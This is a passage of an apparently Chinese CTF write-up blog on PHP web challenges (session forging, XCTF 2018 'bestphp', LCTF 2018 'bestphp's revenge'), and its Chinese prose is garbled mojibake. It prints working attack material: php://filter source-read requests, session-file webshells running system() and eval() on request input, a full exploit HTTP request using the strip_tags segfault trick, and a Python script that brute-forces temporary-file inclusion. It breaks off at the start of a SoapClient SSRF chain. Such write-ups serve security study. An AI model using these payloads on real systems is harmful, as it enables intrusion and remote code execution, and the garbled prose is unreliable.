&lt;p>æœ‰æ·»åŠ note å¯¼å‡ºnoteçš„åŠŸèƒ½ï¼Œä½†æ˜¯å´ä¸æ˜¯å¸¸è§çš„xssï¼ˆå› ä¸ºæ˜¯phpå†™çš„å˜›ï¼‰ï¼Œä¼šæ£€æµ‹sessionä¸­çš„adminæ˜¯ä¸æ˜¯true&lt;/p>
&lt;p>æˆ‘ä»¬çš„çªç ´å£åœ¨å¯¼å‡º.zipè¿™ä¸ªåŠŸèƒ½ä¸Š&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¼ªé€ ä¸€ä¸ªsessionæ–‡ä»¶ï¼Œä¹‹åŽå°†PHPSESSIDè®¾ä¸ºç”Ÿæˆçš„å€¼å³å¯ï¼Œå†…å®¹å‘¢ å°±æ˜¯admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>ç”¨&lt;code>xxxx|N;&lt;/code>é—­åˆå‰é¢è„æ•°æ®ï¼Œç¼–è¾‘åˆ°titleä¸­ï¼Œå°†sessionçš„PHPSESSIDè®¾ç½®å¥½å°±å¯ä»¥getflagäº†&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">è¿™é‡Œæ˜¯dockerçŽ¯å¢ƒ&lt;/a>ï¼ˆæ³¨æ„è®¾ç½®æš´éœ²ç«¯å£ å¦å¤–é¦–é¡µçš„index.phpçš„submitè¦æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>è¿™é‡Œæœ‰ç†Ÿæ‚‰çš„&lt;code>call_user_func&lt;/code>ï¼Œæ¥è¯»ä¸€ä¸‹admin.phpçš„æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†è¯»ä¸€ä¸‹function.phpï¼Œä½†æ˜¯å¥½åƒè¿™ä¿©éƒ½æ²¡å•¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨sessionåŒ…å«ï¼Œä½†æ˜¯index.phpä¸­è®¾ç½®äº†open_basedirï¼Œé»˜è®¤çš„sessionè·¯å¾„æ˜¯&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>ï¼Œä¸è¿‡æœ‰ä¸ªæ–¹å¼å¯ä»¥æ›´æ”¹sessionå­˜å‚¨ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠshellå†™åˆ°webæ ¹ç›®å½•ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;quot;aaa&amp;quot;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¸€èˆ¬çš„ä¸€å¥è¯ä¼šæ²¡æ³•æ­£å¸¸å·¥ä½œï¼ˆä¹‹å‰æ¹–æ¹˜æ¯willphpä¹Ÿæ˜¯è¿™æ ·ï¼Œé‚£ä¸ªæ˜¯&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>æ‹¿åˆ°flag&lt;/p>
&lt;h4 id="è§£æ³•2php70---lfi-via-segmentfault">è§£æ³•2ï¼šphp7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>å¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault&lt;/p>
&lt;p>å¦‚æžœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿žç»­ä¿å­˜ï¼Œä¸ç”¨ç«žäº‰ç›´æŽ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰&lt;/p>
&lt;p>åˆ©ç”¨expï¼ˆæ‰“å‡ºæ¥502æ˜¯æ­£å¸¸æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
------WebKitFormBoundaryeScXqSzdW2v22xyk
Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
Content-Type: image/jpeg
&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šå¸è§†è§’çœ‹çš„è¯æ˜¯è¿™æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>ç”¨pyè„šæœ¬çˆ†ç ´å‡ºæ¥(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çˆ†ç ´æˆåŠŸåŽå°±æ‹¿åˆ°äº†shellï¼Œå…¶ä½™è·Ÿä¸Šé¢ä¸€æ ·&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>â€”â€”â€”â€”è¿™ä¸ªæ —å­ç»“åˆäº†SoapClientå’Œsessionçš„è€ƒç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹&lt;code>call_user_func&lt;/code>ï¼Œå®ƒä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°çš„å‚æ•°ï¼›å¦‚æžœæˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œå®ƒä¼šæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›žè°ƒï¼ˆååºåˆ—åŒ–ä¸­å¸¸è§ï¼‰ï¼›&lt;code>call_user_func&lt;/code>å‡½æ•°ä¸ä»…å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°å’Œç±»ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨phpå†…ç½®å‡½æ•°å’Œå†…ç½®ç±»ï¼Œæ¯”å¦‚&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.phpå¯ä»¥ç›´æŽ¥è®¿é—®ï¼ˆè¿™é‡Œæˆ‘æ²¡æœ‰æ‰« çœ‹wpçŸ¥é“çš„ robots.txtå’Œé¡µé¢æºç éƒ½æ²¡æœ‰ç›´æŽ¥çš„æç¤ºï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>è¿™ä¸ªå›žæ˜¾å¾ˆæ˜Žæ˜¾éœ€è¦ssrfï¼Œä»¥localhostè®¿é—®flag.phpå°±ä¼šå°†flagå†™å…¥SESSIONä¸­&lt;/p>
&lt;p>å†…ç½®ç±»&lt;code>SoapClient()&lt;/code>æ»¡è¶³è¿™ä¸ªéœ€è¦ï¼Œå®ƒå¯ä»¥é€šè¿‡ååºåˆ—åŒ–æ¥å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼ˆéœ€è¦è¢«è°ƒç”¨&lt;code>__call&lt;/code>&lt;/p>
&lt;p>æ‰€ä»¥æ•´ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;ol>
&lt;li>è¦†ç›–åºåˆ—åŒ–å¼•æ“Žä¸º&lt;code>php_serialize&lt;/code>ï¼Œ é€šè¿‡&lt;code>session_start&lt;/code>å°†ä¸€ä¸ªåºåˆ—åŒ–çš„&lt;code>SoapClient&lt;/code>å†™å…¥sessionï¼›ç”±äºŽgetä¼ å…¥çš„nameä¼šè¢«ç›´æŽ¥æ”¾å…¥sessionä¸­ï¼Œæ‰€ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ç”¨postä¼ ï¼Œåªéœ€è¦postä¼ è®¾ç½®ååºåˆ—åŒ–å¼•æ“Žçš„å‚æ•°å°±å¯ä»¥&lt;/li>
&lt;li>ç¬¬ä¸€ä¸ª&lt;code>call_user_func&lt;/code>é€šè¿‡&lt;code>extract&lt;/code>å˜é‡è¦†ç›–ä½¿&lt;code>$b = call_user_func&lt;/code>ï¼Œç¬¬äºŒä¸ª&lt;code>call_user_func&lt;/code>è°ƒç”¨&lt;code>SoapClient-&amp;gt;__call&lt;/code>ï¼ˆä¸å¯è®¿é—®çš„æ–¹æ³• call_user_funcï¼‰&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
